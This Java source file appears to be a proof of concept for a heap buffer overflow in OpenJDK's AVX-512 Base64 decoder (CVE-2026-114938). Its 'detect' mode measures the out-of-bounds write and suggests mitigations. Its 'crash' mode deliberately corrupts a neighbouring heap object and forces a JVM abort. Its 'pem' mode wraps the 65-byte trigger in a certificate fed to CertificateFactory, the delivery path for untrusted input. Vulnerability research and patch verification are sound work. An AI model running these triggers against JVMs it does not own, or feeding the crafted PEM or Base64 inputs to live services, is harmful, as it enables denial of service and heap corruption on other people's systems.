/*
 * Java4ShellPoC.java -- proof of concept for "Java4Shell" (CVE-2026-114938)
 *
 * Heap buffer overflow in the AVX-512 accelerated Base64 decoder intrinsic of OpenJDK
 * (java.util.Base64$Decoder.decodeBlock, StubRoutines::base64_decodeBlock on x86-64).
 *
 * Mechanics, as described in Oligo Security's 2026-11-17 write-up:
 *   1. Input: 64 valid Base64 characters followed by a single '=' (65 bytes).
 *      Older OpenJDK 17 builds need 128 characters + '=' because the vector path threshold is higher.
 *   2. The AVX-512 main loop decodes the first 64 characters into 48 correct output bytes.
 *   3. The tail routine receives 1 byte ('='):  output_size = (1 / 4) * 3 = 0.
 *   4. Padding detected -> output_size-- -> 0xFFFFFFFFFFFFFFFF  (unsigned 64-bit underflow).
 *   5. bzhiq only looks at the low 8 bits of the index; 0xFF >= 64 means "clear nothing",
 *      so the store mask becomes all ones.
 *   6. A 64-byte masked store lands at offset 48 of the 50-byte byte[] Java allocated:
 *      62 bytes are written past the end, onto whatever Java object follows on the heap.
 *
 * Modes
 *   detect (default)  Safe. Uses Base64.Decoder.decode(byte[] src, byte[] dst) with an oversized,
 *                     sentinel-filled dst, so the out-of-bounds store lands inside our own array
 *                     where it can be measured instead of on neighbouring heap objects.
 *   crash             Exactly-sized dst with a victim byte[] allocated right behind it. The overflow
 *                     corrupts the victim's object header; a forced GC then usually aborts the JVM.
 *   pem               Wraps the trigger in a PEM certificate and feeds it to
 *                     CertificateFactory.generateCertificate(), the delivery path shown in the
 *                     write-up (X509Factory.readOneBlock -> Base64$Decoder.decode).
 *
 * Usage
 *   java Java4ShellPoC.java [detect|crash|pem] [--prefix N] [--tail S] [--warmup N] [--rounds N] [--out FILE]
 *
 * Exit status: 0 = nothing observed, 1 = out-of-bounds write or corruption observed, 2 = usage error.
 *
 * Scope: this demonstrates the memory corruption only; it contains no code-execution chain.
 * Run it only against JVMs you own or are authorised to test.
 */

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;

public final class Java4ShellPoC {

    private static final String CVE = "CVE-2026-114938";
    private static final byte[] SENTINELS = {(byte) 0xCC, (byte) 0x33};
    /** Extra bytes of our own array kept behind the logical output in detect mode. */
    private static final int SLACK = 256;

    private static int warmupCalls = 100_000;
    private static int rounds = 2;

    /** Keeps warm-up results and the crash-mode victim reachable so the JIT cannot drop them. */
    private static int sink;
    private static byte[] victim;

    // ------------------------------------------------------------------ probes

    /** A run of valid Base64 characters followed by a tail that reaches the tail routine with (len/4)*3 == 0 and padding. */
    private static final class Probe {
        final String name;
        final int prefixChars;
        final String tail;

        Probe(String name, int prefixChars, String tail) {
            this.name = name;
            this.prefixChars = prefixChars;
            this.tail = tail;
        }

        byte[] input() {
            return ("A".repeat(prefixChars) + tail).getBytes(StandardCharsets.ISO_8859_1);
        }

        /** Bytes the main loop legitimately produces for the prefix. */
        int validOut() {
            return prefixChars / 4 * 3;
        }

        /** Size of the byte[] that Base64.Decoder.decode(byte[]) allocates for this input (mirrors Decoder.outLength). */
        int javaOutLen(boolean mime) {
            int len = prefixChars + tail.length();
            int pads = 0;
            if (mime) {
                int eq = tail.indexOf('=');
                if (eq >= 0) len = prefixChars + eq;   // the MIME variant stops counting at the first '='
            } else if (tail.endsWith("=")) {
                pads = tail.endsWith("==") ? 2 : 1;
            }
            if (pads == 0 && (len & 3) != 0) pads = 4 - (len & 3);
            return 3 * ((len + 3) / 4) - pads;
        }
    }

    private static List<Probe> defaultProbes() {
        List<Probe> p = new ArrayList<>();
        p.add(new Probe("64+'='", 64, "="));       // write-up trigger, current builds
        p.add(new Probe("128+'='", 128, "="));     // write-up trigger, older OpenJDK 17 builds
        p.add(new Probe("256+'='", 256, "="));     // same tail after the 256-byte loop
        p.add(new Probe("64+'=='", 64, "=="));     // other tails with (len/4)*3 == 0 and padding
        p.add(new Probe("64+'A='", 64, "A="));
        p.add(new Probe("64+'AA='", 64, "AA="));
        return p;
    }

    // ------------------------------------------------------------------ main

    public static void main(String[] args) throws Exception {
        String mode = "detect";
        Integer prefix = null;
        String tail = null;
        Path out = null;
        try {
            for (int i = 0; i < args.length; i++) {
                switch (args[i]) {
                    case "detect": case "crash": case "pem": mode = args[i]; break;
                    case "--prefix": prefix = Integer.parseInt(args[++i]); break;
                    case "--tail":   tail = args[++i]; break;
                    case "--warmup": warmupCalls = Integer.parseInt(args[++i]); break;
                    case "--rounds": rounds = Integer.parseInt(args[++i]); break;
                    case "--out":    out = Path.of(args[++i]); break;
                    default: throw new IllegalArgumentException("unknown argument: " + args[i]);
                }
            }
            if (prefix != null && (prefix < 0 || prefix % 4 != 0)) {
                throw new IllegalArgumentException("--prefix must be a non-negative multiple of 4");
            }
        } catch (RuntimeException e) {
            System.err.println(e.getMessage());
            usage();
            System.exit(2);
        }

        List<Probe> probes;
        if (prefix != null || tail != null) {
            int p = prefix == null ? 64 : prefix;
            String t = tail == null ? "=" : tail;
            probes = List.of(new Probe(p + "+'" + t + "'", p, t));
        } else {
            probes = defaultProbes();
        }

        printEnvironment(mode);
        int status;
        switch (mode) {
            case "crash": status = runCrash(probes.get(0)); break;
            case "pem":   status = runPem(probes.get(0), out); break;
            default:      status = runDetect(probes); break;
        }
        System.exit(status);
    }

    private static void usage() {
        System.err.println("usage: java Java4ShellPoC.java [detect|crash|pem] [--prefix N] [--tail S] [--warmup N] [--rounds N] [--out FILE]");
    }

    // ------------------------------------------------------------------ detect

    private static int runDetect(List<Probe> probes) {
        String[] names = {"basic", "url", "mime"};
        Base64.Decoder[] decoders = {Base64.getDecoder(), Base64.getUrlDecoder(), Base64.getMimeDecoder()};
        boolean overflow = false;

        for (int round = 1; round <= rounds && !overflow; round++) {
            boolean verbose = round == 1;
            System.out.printf("%n-- round %d/%d: %,d warm-up calls before every probe keep the JIT-compiled intrinsic in place --%n",
                    round, rounds, warmupCalls);
            for (int d = 0; d < decoders.length; d++) {
                boolean mime = d == 2;
                for (Probe p : probes) {
                    Finding f = probe(decoders[d], p, mime);
                    if (verbose || f.beyondValid > 0) System.out.println(render(names[d], p, mime, f));
                    overflow |= f.overflow();
                }
            }
            if (!verbose && !overflow) System.out.println("   nothing new");
        }

        System.out.println();
        if (overflow) {
            System.out.println("VERDICT: VULNERABLE to " + CVE + ".");
            System.out.println("   The Base64 tail routine wrote past the end of the buffer that decode(byte[]) would have allocated.");
            System.out.println("   A 65-byte input (64 characters + '=') corrupts the Java heap on this JVM.");
            System.out.println("   Fix: update the JDK. Interim: -XX:UseAVX=2 or -XX:-UseBASE64Intrinsics (re-run this tool to confirm),");
            System.out.println("   and keep untrusted Base64 (PEM, tokens, API payloads) away from the decoder.");
            return 1;
        }
        System.out.println("VERDICT: no out-of-bounds write observed in " + rounds + " round(s).");
        System.out.println("   One of: the JDK is patched; the AVX-512 decode intrinsic is not active (needs x86-64 with");
        System.out.println("   avx512bw/avx512vl/avx512vbmi, UseAVX=3 and UseBASE64Intrinsics=true); or the JIT never compiled");
        System.out.println("   the decoder (try -Xcomp -XX:-TieredCompilation, or a larger --warmup).");
        return 0;
    }

    private static final class Finding {
        final String outcome;
        final int first, last, beyondValid, beyondAlloc;
        final byte[] sample;

        Finding(String outcome, int first, int last, int beyondValid, int beyondAlloc, byte[] sample) {
            this.outcome = outcome;
            this.first = first;
            this.last = last;
            this.beyondValid = beyondValid;
            this.beyondAlloc = beyondAlloc;
            this.sample = sample;
        }

        boolean overflow() {
            return beyondAlloc > 0;
        }
    }

    /**
     * Runs one probe against a decoder with an oversized, sentinel-filled output array and reports
     * every byte at or beyond the legitimately decoded prefix that the decoder touched.
     * Two different sentinels are used so that stored data equal to the sentinel cannot hide the write.
     * The decoder is re-warmed before every attempt: the IllegalArgumentException a probe provokes
     * deoptimises decode0, and the interpreter would then silently use the pure-Java decoder.
     */
    private static Finding probe(Base64.Decoder dec, Probe p, boolean mime) {
        byte[] src = p.input();
        int validOut = p.validOut();
        int allocLen = p.javaOutLen(mime);
        Finding best = null;
        for (byte sentinel : SENTINELS) {
            warmUp(dec);
            byte[] dst = new byte[allocLen + SLACK];
            Arrays.fill(dst, sentinel);
            String outcome;
            try {
                outcome = "returned " + dec.decode(src, dst);
            } catch (IllegalArgumentException e) {
                outcome = "threw IllegalArgumentException: " + e.getMessage();
            }
            int first = -1, last = -1, beyondValid = 0, beyondAlloc = 0;
            for (int i = validOut; i < dst.length; i++) {
                if (dst[i] != sentinel) {
                    if (first < 0) first = i;
                    last = i;
                    beyondValid++;
                    if (i >= allocLen) beyondAlloc++;
                }
            }
            byte[] sample = first < 0 ? new byte[0] : Arrays.copyOfRange(dst, first, Math.min(first + 16, last + 1));
            Finding f = new Finding(outcome, first, last, beyondValid, beyondAlloc, sample);
            if (best == null || f.beyondValid > best.beyondValid) best = f;
        }
        return best;
    }

    private static String render(String decoder, Probe p, boolean mime, Finding f) {
        StringBuilder sb = new StringBuilder();
        sb.append(String.format("[%-5s] %-9s %4d B  %s%n", decoder, p.name, p.input().length, f.outcome));
        if (f.beyondValid == 0) {
            sb.append(String.format("        no write beyond offset %d (expected)", p.validOut()));
        } else {
            int allocLen = p.javaOutLen(mime);
            sb.append(String.format("        WROTE %d bytes at offsets %d..%d, %d of them past the %d-byte buffer decode(byte[]) allocates%s%n",
                    f.beyondValid, f.first, f.last, f.beyondAlloc, allocLen,
                    f.overflow() ? "   <-- HEAP OVERFLOW" : " (within bounds)"));
            sb.append("        first bytes written: ").append(hex(f.sample));
        }
        return sb.toString();
    }

    // ------------------------------------------------------------------ crash

    private static int runCrash(Probe p) {
        System.out.println();
        System.out.println("WARNING: crash mode lets the overflow hit a real neighbouring object. Expect a JVM abort (hs_err_pid*.log).");
        Base64.Decoder dec = Base64.getDecoder();
        warmUp(dec);

        byte[] src = p.input();
        int allocLen = p.javaOutLen(false);
        // Exactly-sized output buffer, then a victim array. Both come from the same thread-local
        // allocation buffer, so the victim normally sits right behind dst: its header (mark word,
        // class pointer, length) is the first thing the overflow reaches.
        byte[] dst = new byte[allocLen];
        byte[] v = new byte[64];
        Arrays.fill(v, (byte) 0x41);
        victim = v;
        System.out.printf("dst = byte[%d] (exact size), victim = byte[%d] filled with 0x41, allocated right after it%n", allocLen, v.length);

        try {
            System.out.println("decode returned " + dec.decode(src, dst));
        } catch (IllegalArgumentException e) {
            System.out.println("decode threw IllegalArgumentException: " + e.getMessage() + "  (any overflow has already happened)");
        }

        int len = victimLength();
        System.out.printf("victim.length after decode = %d (expected 64)%n", len);
        int changed = 0;
        try {
            // The bounds check uses the (possibly corrupted) length; a too-small value throws and is reported below.
            for (int i = 0; i < 64; i++) {
                if (victim[i] != 0x41) changed++;
            }
        } catch (Throwable t) {
            System.out.println("reading victim failed: " + t);
        }
        System.out.printf("victim data bytes changed = %d%n", changed);

        boolean corrupted = len != 64 || changed > 0;
        System.out.println(corrupted
                ? "ADJACENT OBJECT CORRUPTED: heap overflow confirmed (" + CVE + ")"
                : "victim intact: not vulnerable, intrinsic not in use, or the victim was not adjacent");
        System.out.println("Forcing a full GC so the collector walks the heap; on a corrupted heap this usually aborts the JVM...");
        System.gc();
        System.out.println("GC completed, JVM still alive.");
        return corrupted ? 1 : 0;
    }

    private static int victimLength() {
        return victim.length;
    }

    // ------------------------------------------------------------------ pem

    private static int runPem(Probe p, Path out) throws IOException {
        String body = new String(p.input(), StandardCharsets.ISO_8859_1);
        String pem = "-----BEGIN CERTIFICATE-----\n" + body + "\n-----END CERTIFICATE-----\n";
        System.out.println();
        if (out != null) {
            Files.writeString(out, pem);
            System.out.println("wrote PEM trigger to " + out.toAbsolutePath());
        }
        warmUp(Base64.getDecoder());
        warmUp(Base64.getMimeDecoder());
        System.out.println("Calling CertificateFactory.generateCertificate() on the PEM (X509Factory.readOneBlock -> Base64 decode)...");
        try {
            CertificateFactory.getInstance("X.509")
                    .generateCertificate(new ByteArrayInputStream(pem.getBytes(StandardCharsets.ISO_8859_1)));
            System.out.println("generateCertificate returned a certificate (unexpected)");
        } catch (CertificateException e) {
            System.out.println("CertificateFactory threw: " + e);
        }
        System.out.println("The decoder allocates its own exactly-sized buffer on this path, so an overflow lands in free heap");
        System.out.println("space and is silent here. Use 'detect' to measure it, or watch it with a runtime protection tool.");
        return 0;
    }

    // ------------------------------------------------------------------ helpers

    /** Calls the decoder with valid input until C2 compiles decode0/decodeBlock and the stub replaces the Java fallback. */
    private static void warmUp(Base64.Decoder dec) {
        byte[] src = "A".repeat(256).getBytes(StandardCharsets.ISO_8859_1);
        byte[] dst = new byte[192 + SLACK];
        for (int i = 0; i < warmupCalls; i++) {
            sink += dec.decode(src, dst);
        }
    }

    private static void printEnvironment(String mode) {
        System.out.println("Java4Shell PoC  " + CVE + "  mode: " + mode);
        System.out.printf("JVM   : %s %s (%s)%n", System.getProperty("java.vm.name"),
                System.getProperty("java.runtime.version"), System.getProperty("java.vendor"));
        System.out.printf("OS    : %s %s %s%n", System.getProperty("os.name"),
                System.getProperty("os.version"), System.getProperty("os.arch"));
        System.out.printf("Flags : UseAVX=%s UseBASE64Intrinsics=%s TieredCompilation=%s%n",
                vmOption("UseAVX"), vmOption("UseBASE64Intrinsics"), vmOption("TieredCompilation"));
        System.out.printf("CPU   : %s%n", cpuAvx512Flags());
        System.out.printf("Args  : %s%n", ManagementFactory.getRuntimeMXBean().getInputArguments());
    }

    private static String vmOption(String name) {
        try {
            com.sun.management.HotSpotDiagnosticMXBean bean =
                    ManagementFactory.getPlatformMXBean(com.sun.management.HotSpotDiagnosticMXBean.class);
            return bean.getVMOption(name).getValue();
        } catch (Throwable t) {
            return "?";
        }
    }

    private static String cpuAvx512Flags() {
        try {
            for (String line : Files.readAllLines(Path.of("/proc/cpuinfo"))) {
                if (line.startsWith("flags")) {
                    List<String> hits = new ArrayList<>();
                    for (String tok : line.substring(line.indexOf(':') + 1).trim().split("\\s+")) {
                        if (tok.startsWith("avx512")) hits.add(tok);
                    }
                    return hits.isEmpty() ? "no avx512* flags, the AVX-512 path cannot be taken" : String.join(" ", hits);
                }
            }
            return "no flags line in /proc/cpuinfo";
        } catch (IOException | RuntimeException e) {
            return "unavailable (" + e.getClass().getSimpleName() + ")";
        }
    }

    private static String hex(byte[] b) {
        StringBuilder sb = new StringBuilder();
        for (byte x : b) sb.append(String.format("%02x ", x));
        return sb.toString().trim();
    }
}
